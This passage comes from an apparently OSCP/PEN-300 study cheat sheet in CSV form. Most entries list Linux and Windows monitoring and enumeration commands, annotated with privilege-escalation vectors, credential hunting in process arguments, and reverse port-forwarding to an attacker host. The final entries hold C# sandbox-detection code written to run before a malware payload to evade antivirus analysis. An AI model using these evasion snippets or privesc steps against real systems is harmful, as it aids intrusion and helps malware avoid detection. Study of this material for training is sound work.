Use +D for recursive search.

Common use:
identify which processes are accessing files in specific directory.","medium"
"cat-wtmp-utmpdump","Parse WTMP Login Records","monitoring","cat /var/log/wtmp | utmpdump","Convert binary wtmp login records to human-readable format","log-monitoring","wtmp logs all login/logout events.

Binary format requires utmpdump or last command.

Better alternative:
'last' command provides formatted output.

Useful for forensics and user activity tracking.","medium"
"crontab-user-list","List User Cron Jobs","monitoring","crontab -l","Display current user's cron jobs (scheduled tasks)","scheduled-tasks","Cron format:
minute hour day month weekday command.

OSCP tip:
Check if cron scripts are writable - modify to run reverse shell as cron user.

Time estimate:
<1 second.

Special strings:
@reboot (run at startup), @daily, @hourly, @weekly, @monthly.","high"
"crontab-user-specific","List Another User's Cron Jobs","monitoring","sudo crontab -l -u <USERNAME>","View cron jobs for a specific user (requires root privileges)","scheduled-tasks","Root's crontab is high-value target.

If root cron runs writable script, instant privesc.

Crontab location varies:
/var/spool/cron/crontabs/ (Debian/Ubuntu), /var/spool/cron/ (RHEL/CentOS).

Time estimate:
<1 second.","high"
"crontab-system-wide","View System-Wide Crontab","monitoring","cat /etc/crontab","Display system-wide cron configuration (runs as root)","scheduled-tasks","/etc/crontab differs from user crontabs - includes username field.

Format:
minute hour day month weekday user command.

OSCP tip:
Check if PATH includes writable dirs like /tmp - allows command hijacking.

Time estimate:
<1 second.","high"
"cron-directories-list","List Cron Directories","monitoring","ls -la /etc/cron.*","List all cron directories (hourly, daily, weekly, monthly) and their contents","scheduled-tasks","Scripts in these directories run automatically:
cron.hourly (every hour), cron.daily (daily), cron.weekly (weekly), cron.monthly (monthly).

All run as root by default.

CRITICAL privesc vector if writable.

Time estimate:
2 seconds.

Command to find writable:
find /etc/cron* -type f -writable 2>/dev/null","high"
"cron-log-recent","View Recent Cron Executions","monitoring","grep -r ""CRON"" /var/log/syslog","Search system logs for recent cron job executions (verify cron activity)","scheduled-tasks","Logs show when cron jobs execute and as which user.

Useful for timing privilege escalation attempts.

On systemd systems:
journalctl -u cron.

Time estimate:
3-5 seconds.","medium"
"win-schtasks-list-all","Windows List All Scheduled Tasks","monitoring","schtasks /query /fo LIST /v","Display all Windows scheduled tasks with verbose details","scheduled-tasks","CRITICAL for Windows privesc and persistence detection.

Output is verbose (20+ properties per task).

OSCP tips:
(1) Look for tasks with writable executables, (2) Tasks running as SYSTEM with Enabled status, (3) Custom tasks (non-Microsoft) in \Task Scheduler Library\.

Time estimate:
10-30 seconds depending on task count.","high"
"win-ps-scheduled-tasks","PowerShell List Scheduled Tasks","monitoring","Get-ScheduledTask | Where-Object {$_.State -ne ""Disabled""}","PowerShell cmdlet to list enabled Windows scheduled tasks","scheduled-tasks","Modern PowerShell approach - faster and easier to parse than schtasks.

To see all tasks:
Get-ScheduledTask (no filter).

Time estimate:
5 seconds.

One-liner for custom tasks:
Get-ScheduledTask | Where-Object {$_.TaskPath -notlike '\Microsoft\*' -and $_.State -eq 'Ready'}","high"
"win-ps-scheduled-task-info","PowerShell Scheduled Task Details","monitoring","Get-ScheduledTask -TaskName <TASK_NAME> | Get-ScheduledTaskInfo","Get detailed information for specific scheduled task including last run time and result","scheduled-tasks","Useful for verifying task execution status.

LastTaskResult 0x0 = success, other values indicate errors.

Time estimate:
1 second.","medium"
"win-schtasks-task-xml","Export Scheduled Task XML","monitoring","schtasks /query /tn <TASK_PATH> /xml","Export scheduled task definition as XML (may contain credentials or sensitive data)","scheduled-tasks","XML may contain Base64-encoded credentials or sensitive command arguments.

Time estimate:
1 second.

Save to file:
schtasks /query /tn <TASK> /xml > task.xml","medium"
"win-wmic-scheduled-job","WMIC AT Jobs (Legacy)","monitoring","wmic job list full","List legacy AT jobs (older Windows scheduling system, pre-Task Scheduler)","scheduled-tasks","AT jobs are legacy (Windows NT/2000 era), rarely used in modern systems.

Included for completeness in older OSCP labs.

Time estimate:
1 second.","low"
"linux-at-jobs-list","List Linux AT Jobs","monitoring","atq","List pending AT jobs (one-time scheduled commands)","scheduled-tasks","AT is for one-time scheduled tasks (unlike cron for recurring).

Less common than cron.

View job:
at -c <JOB_ID>.

Time estimate:
<1 second.","low"
"linux-systemd-timers","List systemd Timers","monitoring","systemctl list-timers --all","List all systemd timers (modern Linux cron alternative)","scheduled-tasks","systemd timers are modern replacement for cron on systemd-based Linux.

Timers trigger .service units.

OSCP tip:
Check /etc/systemd/system/ for custom timers.

Time estimate:
2 seconds.

To see active only:
systemctl list-timers (no --all)","medium"
"tail-follow-log","Follow Log File (Real-Time)","monitoring","tail -f <LOG_FILE>","Monitor log file in real-time, displaying new lines as they are written","log-monitoring","CRITICAL for OSCP defense monitoring and troubleshooting.

Press Ctrl+C to exit.

Common logs:
/var/log/auth.log (authentication), /var/log/syslog (system), /var/log/apache2/access.log (web).

Time estimate:
runs continuously until stopped.

Manual alternative:
while true; do tail -n 1 <FILE>; sleep 1; done","high"
"tail-follow-filter","Follow Log with Grep Filter","monitoring","tail -f <LOG_FILE> | grep --line-buffered <PATTERN>","Monitor log file in real-time, showing only lines matching a pattern","log-monitoring","--line-buffered is REQUIRED or grep will buffer output and display will be delayed.

OSCP defense patterns:
'Failed password' (brute force), 'Invalid user' (enumeration), 'Accepted publickey' (successful login), 'sudo.*COMMAND' (privilege usage).

Time estimate:
runs continuously.","high"
"tail-follow-multiple","Follow Multiple Log Files","monitoring","tail -f <LOG_FILE1> <LOG_FILE2>","Monitor multiple log files simultaneously in real-time with file labels","log-monitoring","File headers show which file each line comes from:
==> /var/log/syslog <==.

Useful for correlating events across logs.

Time estimate:
runs continuously.","medium"
"journalctl-follow","Follow systemd Journal (Real-Time)","monitoring","journalctl -f","Monitor systemd journal in real-time (unified logging for modern Linux)","log-monitoring","systemd journal is unified log system on modern Linux.

Combines all system and service logs.

OSCP tip:
Great for monitoring service failures, authentication attempts, and system events.

Time estimate:
runs continuously.

For systems without systemd:
fall back to tail -f /var/log/syslog","high"
"journalctl-service-follow","Follow Specific Service Logs","monitoring","journalctl -u <SERVICE> -f","Monitor logs for a specific systemd service in real-time","log-monitoring","Service-specific monitoring helps troubleshoot issues.

Common services:
ssh, apache2, nginx, mysql, postgresql, cron.

Can monitor multiple:
journalctl -u ssh -u apache2 -f.

Time estimate:
runs continuously.","high"
"journalctl-priority-filter","Filter Journal by Priority","monitoring","journalctl -p <PRIORITY>","Display journal entries at or above specified priority level (emerg, alert, crit, err, warning, notice, info, debug)","log-monitoring","Priority levels (lowest to highest):
0=emerg, 1=alert, 2=crit, 3=err, 4=warning, 5=notice, 6=info, 7=debug.

-p err shows errors, critical, alert, and emergency.

For errors only (not above):
journalctl PRIORITY=3.

Time estimate:
1-5 seconds.","medium"
"journalctl-time-range","View Journal by Time Range","monitoring","journalctl --since ""<TIME_SPEC>"" --until ""<TIME_SPEC>""","Display journal entries within a specific time range","log-monitoring","Time formats:
'YYYY-MM-DD HH:MM:SS', 'yesterday', 'today', '1 hour ago', '30 minutes ago', '2 days ago'.

Supports natural language.

For recent events:
journalctl --since ""5 minutes ago"".

Time estimate:
1-10 seconds.","medium"
"dmesg-kernel-messages","View Kernel Ring Buffer","monitoring","dmesg","Display kernel messages from boot and hardware events (ring buffer)","log-monitoring","Kernel ring buffer shows hardware events, driver loading, errors.

Useful for hardware troubleshooting and detecting inserted USB devices.

Output can be large - pipe to less:
dmesg | less.

Time estimate:
1-2 seconds.","medium"
"dmesg-follow","Follow Kernel Messages (Real-Time)","monitoring","dmesg -w","Monitor kernel messages in real-time (hardware events, driver issues, errors)","log-monitoring","-w flag requires dmesg from util-linux 2.21+ (2012+).

Older systems:
use watch -n 1 'dmesg | tail -20'.

Useful for detecting hardware insertion (USB drives).

Time estimate:
runs continuously.","low"
"grep-auth-failed","Search for Failed Authentication","monitoring","grep -i ""failed"" /var/log/auth.log","Search authentication log for failed login attempts (brute force detection)","log-monitoring","CRITICAL for OSCP defense.

Patterns:
'Failed password for <USER>' (wrong password), 'Invalid user <USER>' (enumeration), 'Failed publickey for <USER>' (SSH key failed).

Multiple failures from same IP = brute force attack.

Time estimate:
1-3 seconds.

Log location varies:
/var/log/auth.log (Debian/Ubuntu), /var/log/secure (RHEL/CentOS).","high"
"grep-sudo-commands","Search for Sudo Command Usage","monitoring","grep -i ""sudo.*COMMAND"" /var/log/auth.log","Extract all sudo command executions from auth log (privilege escalation tracking)","log-monitoring","CRITICAL for defense auditing.

Each sudo execution is logged with:
timestamp, user, command, working directory.

OSCP tip:
Look for suspicious commands:
bash, sh, vi, less, find, python (all can spawn shells).

Time estimate:
2-5 seconds depending on log size.","high"
"lastb-failed-logins","Failed Login Attempts","monitoring","lastb -a","Display all failed login attempts from btmp log (bad login tracking)","log-monitoring","Reads /var/log/btmp (bad login log).

MUST run as root.

OSCP defense tip:
Multiple failures = brute force.

Look for:
(1) Same IP, multiple users (enumeration), (2) Same user, many attempts (password guessing), (3) Many IPs, same user (distributed attack).

Time estimate:
1-5 seconds depending on attack history.","high"
"journalctl-boot-messages","View Boot Messages","monitoring","journalctl -b","Display all journal entries from current boot","log-monitoring","Shows everything from current boot:
kernel, systemd, services.

Previous boot:
-b -1, boot before that:
-b -2, etc.

List boots:
journalctl --list-boots.

Time estimate:
2-10 seconds depending on boot log size.","low"
"systemctl-list","List Systemd Services","monitoring","systemctl list-units --type=service --state=<STATE>","List systemd services filtered by state. Essential for discovering running services, identifying attack surface, and finding privilege escalation vectors through writable service files.","linux-process-monitoring","**OSCP METHODOLOGY - Service Enumeration for PrivEsc:**

**1. WHY This Command (OSCP Context):**
Systemd services often run as root and are prime targets for privilege escalation. Writable service files, exploitable binaries, or PATH hijacking in service ExecStart directives can lead to root shells. This command is the first step in service-based privilege escalation methodology.

**2. MANUAL ALTERNATIVES (No Tool Available):**
- SysVinit systems: `ls -la /etc/init.d/` and `service --status-all`
- Read systemd unit files directly: `ls -la /etc/systemd/system/*.service`
- Check service status: `ps aux | grep <service_name>`
- Alternative init systems: `chkconfig --list` (RHEL/CentOS), `update-rc.d` (Debian)

**3. OSCP WORKFLOW (Typical Usage):**
```bash
# Step 1: List all running services
systemctl list-units --type=service --state=running --no-pager

# Step 2: List failed services (often reveal misconfigurations)
systemctl list-units --type=service --state=failed --no-pager

# Step 3: Get detailed service info
systemctl status <service_name>

# Step 4: Check service file permissions
systemctl show <service_name> -p FragmentPath --no-pager
ls -la $(systemctl show <service_name> -p FragmentPath --no-pager | cut -d= -f2)

# Step 5: Read service configuration for ExecStart path
systemctl cat <service_name>

# Step 6: Check if ExecStart binary is writable
ls -la /path/to/binary
```

**4. PRIVILEGE ESCALATION VECTORS:**
- **Writable Service Files**: If you can write to /etc/systemd/system/<service>.service, modify ExecStart to run your payload as root
- **Writable ExecStart Binary**: If the binary in ExecStart is writable, replace it with malicious code
- **PATH Hijacking**: If ExecStart uses relative paths, exploit PATH variable to run your binary first
- **Failed Services**: Services in failed state often reveal permission issues or missing dependencies you can exploit
- **Timer Units**: Check for .timer units that run services - these might run as root on schedule

**5. TIME ESTIMATES (OSCP Exam):**
- Initial enumeration: 2-5 minutes
- Analyzing each interesting service: 3-5 minutes per service
- Testing writable service files: 5-10 minutes
- Full service-based privesc attempt: 15-30 minutes total

**6. COMMON PITFALLS:**
- Don't just list services - analyze each one. Check permissions, ExecStart binaries, and configuration files.
- Failed services are gold - they often reveal misconfigurations you can exploit.
- Always check service file permissions: `ls -la /etc/systemd/system/` and `/lib/systemd/system/`
- Don't forget timer units: `systemctl list-timers --all` shows scheduled tasks

**7. WHAT TO LOOK FOR (OSCP Success Indicators):**
- Services running as root with writable configuration files
- ExecStart directives with writable binaries or relative paths
- Services in failed state with permission denied errors
- Custom services in /etc/systemd/system/ (more likely to have misconfigurations)
- Services with EnvironmentFile directives pointing to writable files

**8. ALTERNATIVE COMMANDS (Same Goal):**
- `service --status-all` - SysVinit alternative, shows all services
- `chkconfig --list` - RHEL/CentOS service listing
- `ps aux | grep <service>` - Manual process verification
- `ls /etc/systemd/system/*.service` - Direct file listing
- `find / -name '*.service' -type f 2>/dev/null` - Find all service files

**9. INTEGRATION WITH OTHER ENUM:**
Combine with:
- `linpeas.sh` or `linenum.sh` - Automated privilege escalation enumeration
- `find / -writable -type f 2>/dev/null` - Find all writable files
- `getcap -r / 2>/dev/null` - Check for capabilities
- `sudo -l` - Check sudo permissions

**CRITICAL OSCP TIP**: Don't just run this command and move on. For EACH running service, check: (1) Service file permissions, (2) ExecStart binary permissions, (3) EnvironmentFile permissions, (4) User/Group the service runs as. One writable file = root shell.","high"
"lsof-list","List Open Files and Network Connections","monitoring","lsof -i <PROTOCOL>:<PORT> -n -P","List open files, network connections, and file descriptors. Critical for discovering internal services, active connections, unix sockets, and file locks that reveal privilege escalation vectors or lateral movement opportunities.","linux-process-monitoring","**OSCP METHODOLOGY - Internal Service Discovery:**

**1. WHY This Command (OSCP Context):**
lsof is critical for post-exploitation enumeration. It reveals services bound to localhost (127.0.0.1) that aren't visible from external nmap scans. These internal services often lack authentication, have weaker security, and provide direct privilege escalation or lateral movement paths. Many OSCP boxes have MySQL, Redis, or web services on localhost with no credentials required.

**2. MANUAL ALTERNATIVES (No lsof Available):**
```bash
# Method 1: Check /proc filesystem
ls -la /proc/*/fd/ | grep socket
for pid in /proc/[0-9]*; do ls -la $pid/fd/ 2>/dev/null | grep socket; done

# Method 2: netstat (usually available)
netstat -tulpn  # TCP/UDP listening ports
netstat -anp    # All network connections

# Method 3: ss (modern netstat replacement)
ss -tulpn       # TCP/UDP listening ports
ss -anp         # All connections

# Method 4: Read /proc/net directly
cat /proc/net/tcp    # Active TCP connections (hex format)
cat /proc/net/udp    # Active UDP connections
cat /proc/net/unix   # Unix domain sockets

# Method 5: Check specific ports
cat /proc/net/tcp | awk '{print $2}' | cut -d: -f2 | sort -u | while read port; do echo ""Port: $((16#$port))""; done
```

**3. OSCP WORKFLOW (Typical Usage):**
```bash
# Step 1: Discover all listening services (internal + external)
lsof -i -n -P | grep LISTEN

# Step 2: Focus on localhost-only services (127.0.0.1)
lsof -i -n -P | grep ""127.0.0.1.*LISTEN""

# Step 3: Check specific interesting ports
lsof -i :3306 -n -P  # MySQL
lsof -i :6379 -n -P  # Redis
lsof -i :8080 -n -P  # HTTP alternate
lsof -i :5432 -n -P  # PostgreSQL

# Step 4: See what files root has open
lsof -u root | head -50

# Step 5: Find Unix domain sockets (local IPC)
lsof -U

# Step 6: Check what processes are using /tmp (privesc vector)
lsof +D /tmp
```

**4. PRIVILEGE ESCALATION VECTORS:**
- **Localhost MySQL/PostgreSQL (no password)**: Connect locally, escalate via UDF, raptor exploit, or file writes
- **Localhost Redis (no auth)**: Use Redis RCE techniques - write SSH keys, cron jobs, or load modules
- **Unix Sockets in /tmp**: If writable, might allow privilege escalation via socket injection
- **Writable files open by root**: If root has files open that you can write to, modify them for code execution
- **Internal web services**: Often lack authentication when bound to 127.0.0.1 - direct access to admin panels

**5. LATERAL MOVEMENT (Port Forwarding):**
Once you discover localhost services, pivot to access them:
```bash
# SSH local port forward (from your kali to target's localhost)
ssh -L 3306:127.0.0.1:3306 user@target

# SSH remote port forward (expose target's localhost to your kali)
ssh -R 8080:127.0.0.1:80 kali@<your_ip>

# Chisel (when SSH not available)
# On kali: ./chisel server -p 8000 --reverse
# On target: ./chisel client <kali_ip>:8000 R:3306:127.0.0.1:3306
```

**6. TIME ESTIMATES (OSCP Exam):**
- Initial lsof enumeration: 2-3 minutes
- Analyzing each internal service: 5-10 minutes per service
- Setting up port forward: 5 minutes
- Exploiting internal service: 10-30 minutes
- Full internal service discovery workflow: 20-40 minutes total

**7. COMMON PITFALLS:**
- Don't skip lsof just because nmap found all ports - localhost services won't show in nmap
- Always use -n and -P flags to prevent DNS/port lookups (faster and stealthier)
- Don't ignore Unix domain sockets (-U flag) - these can be privilege escalation vectors
- Remember to check what files root has open (lsof -u root) - might find writable configs

**8. HIGH-VALUE TARGETS (What to Look For):**
- **MySQL on 127.0.0.1:3306**: Try connecting with no password, check for UDF privilege escalation
- **Redis on 127.0.0.1:6379**: No auth = full control, write SSH keys or cron jobs
- **PostgreSQL on 127.0.0.1:5432**: Similar to MySQL, UDF exploits possible
- **HTTP on 127.0.0.1:8080/8000/3000**: Internal admin panels, often no authentication
- **Elasticsearch on 127.0.0.1:9200**: File write via log injection, code execution
- **Memcached on 127.0.0.1:11211**: Might contain credentials or session tokens
- **Unix sockets in /tmp or /var/run**: IPC mechanisms, sometimes exploitable

**9. ALTERNATIVE COMMANDS (Same Goal):**
- `netstat -tulpn` - Show TCP/UDP listening ports (similar to lsof -i | grep LISTEN)
- `ss -tulpn` - Modern netstat replacement, faster
- `netstat -anp` - Show all network connections with PIDs
- `ss -anp` - Modern alternative to netstat -anp
- `ls -la /proc/*/fd/` - Manual method, check file descriptors in /proc
- `cat /proc/net/tcp` - Raw TCP connection table (hex format)

**10. INTEGRATION WITH OTHER ENUM:**
Combine with:
- `ps aux` - Identify interesting processes, then use lsof -p <pid>
- `netstat -tulpn` - Verify lsof results, cross-reference listening ports
- `linpeas.sh` - Automated enumeration includes lsof output
- `curl http://127.0.0.1:<port>` - Test discovered localhost services
- `mysql -h 127.0.0.1 -u root` - Test localhost MySQL with no password

**CRITICAL OSCP TIP**: Immediately after getting shell access, run 'lsof -i -n -P | grep LISTEN' to discover localhost services. These are GOLD - often no authentication, no firewall, direct root access. A localhost MySQL or Redis with no password is often a direct path to root. Don't skip this step.","high"
"ps-sort-memory","Top Memory Consumers","monitoring","ps aux --sort=-%mem | head -10","List top 10 processes by memory usage (identify memory leaks or suspicious high-memory processes)","resource-monitoring","OSCP defense tip:
Unexpected high-memory processes may indicate cryptominers, memory scrapers, or DoS attacks.

For top CPU:
ps aux --sort=-%cpu | head -10.

Time estimate:
2 seconds.","medium"
"ps-sort-cpu","Top CPU Consumers","monitoring","ps aux --sort=-%cpu | head -10","List top 10 processes by CPU usage (identify CPU-intensive or suspicious processes)","resource-monitoring","OSCP defense tip:
Unexpected 100% CPU usage may indicate cryptominers, brute-force attacks, or fork bombs.

Time estimate:
2 seconds.","medium"
"free-memory-human","Memory Usage (Human Readable)","monitoring","free -h","Display system memory usage in human-readable format (total, used, free, shared, buff/cache, available)","resource-monitoring","'available' is key metric - memory available for starting new applications (includes reclaimable cache).

Low available memory = system under pressure.

Swap usage (high) = memory exhaustion.

Time estimate:
<1 second.","medium"
"vmstat-cpu-monitoring","Virtual Memory Statistics","monitoring","vmstat 1 5","Monitor CPU, memory, I/O, and system activity with 5 samples at 1-second intervals","resource-monitoring","Key columns:
r (processes waiting for CPU), b (blocked on I/O), si/so (swap in/out), us (user CPU%), sy (system CPU%), id (idle CPU%), wa (I/O wait%).

High 'wa' = disk bottleneck.

For continuous:
vmstat 1.

Time estimate:
5 seconds for 5 samples.","low"
"iostat-disk-stats","I/O Statistics (Disk Activity)","monitoring","iostat -x 1 5","Monitor disk I/O statistics with extended details (5 samples at 1-second intervals)","resource-monitoring","Key metrics:
r/s (reads/sec), w/s (writes/sec), %util (disk busy %), await (average I/O wait time in ms).

%util >80% consistently = disk bottleneck.

Time estimate:
5 seconds for 5 samples.

Part of sysstat package.","low"
"uptime-load-average","System Uptime and Load Average","monitoring","uptime","Display system uptime and load averages (1, 5, 15 minute averages)","resource-monitoring","Load average shows average number of processes in run queue.

On 4-core system:
load of 4.0 = 100% CPU utilization, 8.0 = 200% (overloaded).

Three numbers:
1-min, 5-min, 15-min averages.

Time estimate:
<1 second.","low"
"df-disk-usage","Disk Space Usage","monitoring","df -h","Display disk space usage for all filesystems in human-readable format","resource-monitoring","OSCP tip:
Full disk can prevent logging, break services, and stop reverse shells.

Check Use% column.

For specific directory:
df -h /var.

Time estimate:
1 second.","medium"
"du-directory-usage","Directory Disk Usage","monitoring","du -sh <DIRECTORY>","Show total disk usage for a directory in human-readable format","resource-monitoring","Useful for finding what's consuming disk space.

To see subdirectories:
du -h <DIR> --max-depth=1 | sort -hr.

Time estimate:
1-10 seconds depending on directory size.","medium"
"lsof-user-files","Files Opened by User","monitoring","lsof -u <USERNAME>","List all files opened by a specific user (file handles, network connections, devices)","resource-monitoring","Shows everything a user has open:
regular files, directories, network sockets, devices.

Useful for investigating compromised accounts.

Time estimate:
2-5 seconds.","medium"
"lsof-directory-usage","Processes Using Directory","monitoring","lsof +D <DIRECTORY>","Find all processes that have files open within a directory (recursively)","resource-monitoring","Useful before unmounting filesystems or deleting directories.

+D is recursive (slow), +d is non-recursive (fast).

Time estimate:
5-30 seconds depending on directory size.","medium"
"fuser-directory-processes","Processes Using Directory (fuser)","monitoring","fuser -v <DIRECTORY>","Identify processes using files or directories (lighter than lsof)","resource-monitoring","Lighter weight than lsof.

Useful before unmounting.

ACCESS types:
c (current directory), e (executable), f (open file), r (root directory).

Time estimate:
1 second.","low"
"w-user-activity","User Activity (Who is Logged In)","monitoring","w","Show who is logged in and what they are doing, plus system load","resource-monitoring","CRITICAL for defense monitoring.

Shows active users, their terminal, source IP (FROM), login time, idle time, and current command.

OSCP tip:
Check FROM column for unexpected IPs, WHAT column for suspicious commands (shells, persistence scripts).

Time estimate:
<1 second.","medium"
"who-logged-in","Who is Logged In (Detailed)","monitoring","who -a","Display all information about logged-in users including login time and source","resource-monitoring","More detailed than 'users' command but less info than 'w'.

Shows boot time, runlevel, login processes.

Time estimate:
<1 second.","low"
"last-login-history","Login History","monitoring","last -a","Display login history from wtmp log (who logged in, when, from where, how long)","resource-monitoring","Reads /var/log/wtmp.

OSCP defense tip:
Look for (1) Logins from unexpected IPs, (2) Short-lived sessions (in/out quickly = potential intrusion), (3) Logins at unusual hours.

For specific user:
last -a <USERNAME>.

Time estimate:
1-3 seconds.","medium"
"lastlog-user-last","Last Login for All Users","monitoring","lastlog","Display last login time for all users on the system","resource-monitoring","Shows one entry per user (most recent login).

Reads /var/log/lastlog.

'**Never logged in**' is normal for service accounts.

Time estimate:
1 second.","low"
"ps-aux-full","Full Process Snapshot","monitoring","ps aux","Display all running processes with user, PID, CPU, memory, and command details","process-enumeration","OSCP Tip:
Look for (1) processes running as root from writable directories (/tmp, /var/tmp), (2) custom services that might have misconfigurations, (3) database processes (mysql, postgresql) for credential hunting.

Common manual alternative:
cat /proc/*/cmdline (view process command lines directly from /proc filesystem).

Time estimate:
5 seconds.","high"
"ps-auxww-no-truncate","Full Process Snapshot (No Truncation)","monitoring","ps auxww","Display all processes with full command lines (no truncation) - critical for finding hidden arguments","process-enumeration","CRITICAL for OSCP:
Passwords often passed as command-line arguments (mysql -u root -pPASSWORD, ssh user@host -i /path/key).

The 'ww' flag prevents truncation that would hide these.

Manual alternative:
for pid in /proc/[0-9]*; do cat $pid/cmdline 2>/dev/null | tr '\0' ' '; echo; done.

Time estimate:
5 seconds.","high"
"ps-ef-full","Process List with Parent PIDs","monitoring","ps -ef","Alternative process format showing parent PID (PPID) for process hierarchy analysis","process-enumeration","PPID (Parent Process ID) helps identify how processes were spawned.

For example, PPID=1 means process was started by init/systemd (system service), while other PPIDs might indicate user-spawned or malicious processes.

Time estimate:
5 seconds.","medium"
"pstree-hierarchy","Process Tree with PIDs","monitoring","pstree -p","Display process hierarchy as tree structure with PIDs - visualize parent-child relationships","process-enumeration","Excellent for spotting reverse shells or unauthorized processes.

For example, www-data -> bash -> nc indicates a web shell spawned netcat.

Manual alternative:
ps auxf (forest mode shows hierarchy with ASCII art).

Time estimate:
5 seconds.","medium"
"top-snapshot","Top Processes (Snapshot)","monitoring","top -n 1 -b","Non-interactive top snapshot - capture current top CPU/memory consumers for documentation","process-enumeration","Batch mode (-b) makes output suitable for documentation or log files.

Without -b, top is interactive and not useful in scripts.

For real-time monitoring, omit these flags and use:
top.

Time estimate:
5 seconds.","medium"
"pgrep-pattern-search","Find Processes by Name Pattern","monitoring","pgrep -af <PATTERN>","Search for running processes matching a pattern with full command line display","process-enumeration","Much faster than 'ps aux | grep' and doesn't show the grep process itself.

Use -i for case-insensitive:
pgrep -afi <PATTERN>.

Time estimate:
1 second.

OSCP tip:
Search for common services:
pgrep -af 'mysql|postgresql|apache|nginx|ssh|vsftpd' to identify attack vectors.","high"
"pidof-exact","Get PID by Exact Name","monitoring","pidof <PROCESS_NAME>","Quickly get PID(s) of processes by exact name match","process-enumeration","Returns ALL PIDs if multiple instances running.

For single PID:
pidof <NAME> | head -1.

Time estimate:
<1 second.","medium"
"ps-user-filter","Processes by User","monitoring","ps -u <USERNAME>","List all processes running as a specific user","process-enumeration","OSCP tip:
Check www-data processes for web vulnerabilities, mysql processes for database attack vectors, root processes for privilege escalation opportunities.

Time estimate:
2 seconds.","high"
"ps-pid-details","Get Full Command for PID","monitoring","ps -p <PID> -o cmd=","Display full command line for a specific PID without header (clean output)","process-enumeration","The '=' after 'cmd' removes the header for cleaner parsing in scripts.

For multiple fields:
ps -p <PID> -o pid=,cmd=,user=.

Time estimate:
<1 second.","medium"
"win-tasklist-verbose","Windows Task List (Verbose)","monitoring","tasklist /v","Display all Windows processes with verbose details including window titles and memory usage","process-enumeration","Window titles often reveal sensitive information (open files, database connections).

OSCP tip:
Look for (1) processes running from unusual locations (\Temp, \Users\Public), (2) processes with high privileges (SYSTEM), (3) non-standard services.

Time estimate:
5 seconds.","high"
"win-tasklist-services","Windows Task List with Services","monitoring","tasklist /svc","Display which Windows services are running in each process (svchost.exe mapping)","process-enumeration","Critical for Windows privilege escalation.

svchost.exe hosts multiple services - this command reveals which ones.

Time estimate:
5 seconds.

OSCP tip:
Combine with service configuration checks to find writable service binaries or unquoted service paths.","high"
"win-wmic-process-full","Windows WMIC Process Details","monitoring","wmic process list full","Comprehensive Windows process information including full paths, command lines, and parent PIDs","process-enumeration","WMIC deprecated in Windows 11+ but still present in OSCP target systems.

Output is verbose (30+ properties per process).

For specific fields:
wmic process get ProcessId,Name,ExecutablePath,CommandLine.

Time estimate:
10 seconds.

OSCP tip:
CommandLine often contains credentials passed as arguments.","high"
"win-ps-get-process","PowerShell Get Process","monitoring","Get-Process | Select-Object Name,Id,Path,Company","PowerShell process enumeration with selected properties (Name, PID, Path, Company)","process-enumeration","PowerShell is the modern Windows process management tool.

Company field helps identify third-party software (potential attack vectors).

For all properties:
Get-Process | Select-Object *.

Time estimate:
5 seconds.

OSCP tip:
Non-Microsoft processes often have weak permissions or outdated versions with known exploits.","high"
"win-ps-get-process-detailed","PowerShell Get Process (Full Details)","monitoring","Get-WmiObject win32_process | Select-Object Name,ProcessId,ExecutablePath,CommandLine","PowerShell WMI process query with command-line arguments (reveals passwords, tokens)","process-enumeration","CRITICAL for credential discovery.

CommandLine field shows full arguments including passwords, API keys, database strings.

Time estimate:
10 seconds.

OSCP tip:
Common patterns to grep:
'-p ', 'password=', 'token=', 'key=', 'api_key='.

Modern alternative:
Get-CimInstance win32_process (replaces Get-WmiObject in PowerShell 3.0+).","high"
"sleep-timer-validation","Sleep Timer with Validation","heuristic-evasion","using System;
using System.Threading;

DateTime t1 = DateTime.Now;
Thread.Sleep(<SLEEP_MS>);
double deltaT = DateTime.Now.Subtract(t1).TotalSeconds;
if(deltaT < <THRESHOLD_SEC>) {
    return; // Sandbox detected
}
// Continue execution","Detect sandbox by measuring actual elapsed time vs requested sleep duration. Sandboxes skip Sleep() calls to speed up analysis - detect by checking if sufficient time actually passed.","","Syntax:
Add to C# Main() before payload execution Simple but effective against basic sandboxes.

10 seconds standard.

Combine with other checks for best results.

See also:
csharp-sleep-timer in shellcode-runners.

Time estimate:
1 minute (integration) References:
docs/av-evasion/heuristic-evasion.md#sleep-timer, shellcode-runners.json#csharp-sleep-timer, PEN-300 Chapter 6.6.1 Manual alternative:
Use GetTickCount() before/after sleep, or QueryPerformanceCounter for high-resolution timing",""
"non-emulated-api-numa","Non-Emulated API (VirtualAllocExNuma)","heuristic-evasion","using System;
using System.Runtime.InteropServices;

[DllImport(""kernel32.dll"", SetLastError = true, ExactSpelling = true)]
static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress, uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);

[DllImport(""kernel32.dll"")]
static extern IntPtr GetCurrentProcess();

IntPtr mem = VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x4, 0);
if(mem == IntPtr.Zero) {
    return; // Sandbox detected
}","Detect sandbox/emulation by calling VirtualAllocExNuma - rarely emulated API. If returns NULL, indicates emulated environment. NUMA APIs require actual hardware support.","","Syntax:
Add to C# Main() before payload execution More sophisticated than sleep timer.

Bypasses time-aware sandboxes.

Quick to implement.

See also:
csharp-non-emulated-api in shellcode-runners.

Time estimate:
2 minutes (integration) References:
docs/av-evasion/heuristic-evasion.md#non-emulated-apis, shellcode-runners.json#csharp-non-emulated-api, PEN-300 Chapter 6.6.2 Manual alternative:
Use FlsAlloc, GetTickCount64, or other non-emulated APIs.

Check for debugger with IsDebuggerPresent.",""
"large-memory-allocation","Large Memory Allocation Check","heuristic-evasion","using System;

IntPtr mem = IntPtr.Zero;
try {
    mem = Marshal.AllocHGlobal(<LARGE_SIZE>); // e.g., 100MB
    if(mem == IntPtr.Zero) {
        return; // Allocation failed - sandbox
    }
    Marshal.FreeHGlobal(mem);
} catch {
    return; // Exception - sandbox
}","Detect limited sandbox resources by attempting large memory allocation. Sandboxes often have memory constraints - fail if allocation fails.","","Syntax:
Add before payload execution Simple but less reliable than API checks.

Best used as additional layer.

100MB is safe middle ground.

Don't go too large or real systems fail.

Time estimate:
1 minute References:
docs/av-evasion/heuristic-evasion.md#memory-checks Manual alternative:
Use VirtualAlloc with large size, or allocate multiple large arrays",""
"check-processor-count","Processor Count Check","heuristic-evasion","using System;

int cores = Environment.ProcessorCount;
if(cores < <MIN_CORES>) {
    return; // Sandbox detected
